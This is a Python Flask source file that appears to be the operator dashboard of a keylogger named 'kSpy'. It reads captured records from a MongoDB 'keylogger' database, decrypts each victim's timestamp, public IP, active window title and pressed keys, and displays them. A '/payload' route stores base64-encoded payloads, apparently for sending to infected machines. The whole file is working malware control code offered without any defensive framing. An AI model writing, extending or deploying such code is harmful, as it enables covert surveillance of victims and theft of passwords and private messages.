import os
import base64
import pymongo
import webbrowser
from dotenv import load_dotenv
from flask import Flask, render_template, request, redirect
from cryptography.fernet import Fernet

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__, template_folder=os.path.dirname(os.path.abspath(__file__)))

# MongoDB connection
kSpy_client = pymongo.MongoClient(os.getenv("KSPY_MONGODB_URI"))

# Keylogger database
keylogger_db = kSpy_client["keylogger"]
keylogs_collection = keylogger_db["keylog"]
payload_collection = keylogger_db["payload"]

# Function to initialize Fernet with the key from the MongoDB document
def get_fernet_key(mongo_document):
    try:
        # Extract base64 encoded encryption key from the document
        encryption_key_base64 = mongo_document['encryption_key']
        
        # Ensure the key is a string before decoding
        if isinstance(encryption_key_base64, str):
            encryption_key = base64.b64decode(encryption_key_base64)
            return Fernet(encryption_key)
        else:
            print(f"Encryption key is not a string: {encryption_key_base64}")
            return None
    except KeyError as e:
        print(f"Missing key in document: {e}")
        return None  # Handle missing key scenario
    except Exception as e:
        print(f"Error retrieving key: {e}")
        return None  # Handle any other error

# Function to decrypt fields in the MongoDB document
def decrypt_field(encrypted_field, cipher):
    try:
        # Decode the base64 encoded field
        if isinstance(encrypted_field, str):
            print(f"Attempting to decrypt field: {encrypted_field}")  # Debug line
            encrypted_data = base64.b64decode(encrypted_field)

            # Decrypt the data using Fernet cipher
            decrypted_data = cipher.decrypt(encrypted_data).decode('utf-8')
            print(f"Decrypted data: {decrypted_data}")  # Debug line
            return decrypted_data
        else:
            print("Encrypted field is not a string.")
            return "Invalid Encrypted Field"
    except Exception as e:
        print(f"Error decrypting field: {e}")
        return "Decryption Failed"

@app.route('/')
def home():
    # Fetch keylogs from MongoDB
    keylogs = keylogs_collection.find({})
    
    formatted_keylogs = []
    for log in keylogs:
        cipher = get_fernet_key(log) if 'encryption_key' in log else None
        
        # Only attempt decryption if the cipher was successfully created
        if cipher:
            # Make sure to check if these fields exist in the document
            timestamp = log.get('timestamp')
            public_ip = log.get('public_ip')
            window_title = log.get('window_title')
            key_pressed = log.get('key_pressed')

            decrypted_timestamp = decrypt_field(timestamp, cipher) if timestamp else "[Missing Timestamp]"
            decrypted_public_ip = decrypt_field(public_ip, cipher) if public_ip else "[Missing Public IP]"
            decrypted_window_title = decrypt_field(window_title, cipher) if window_title else "[Missing Window Title]"
            decrypted_key_pressed = decrypt_field(key_pressed, cipher) if key_pressed else "[Missing Key Pressed]"

            # Format the log entry
            formatted_keylogs.append(
                f"[{decrypted_timestamp}] [{decrypted_public_ip}] > {decrypted_window_title} ---> {decrypted_key_pressed}"
            )
        else:
            formatted_keylogs.append( 
                f"[{log.get('timestamp', 'Unknown Timestamp')}] [{log.get('public_ip', 'Unknown IP')}] > {log['window_title']} ---> {log['key_pressed']}")

    return render_template('index.html', logs=formatted_keylogs)

@app.route('/payload', methods=['POST'])
def save_payload():
    if request.method == 'POST':
        payload_data = request.form['payload']
        save_payload_to_db(payload_data)
    return redirect(request.referrer)

def save_payload_to_db(payload_data):
    payload_bytes = payload_data.encode('utf-8')
    payload_document = {"text": base64.b64encode(payload_bytes).decode('utf-8')}
    payload_collection.insert_one(payload_document)

# <--run on localhost-->
# if __name__ == '__main__':
#     webbrowser.open('http://127.0.0.1:8000')
#     app.run(host='127.0.0.1', port=8000)  
#     # app.run(host='0.0.0.0')
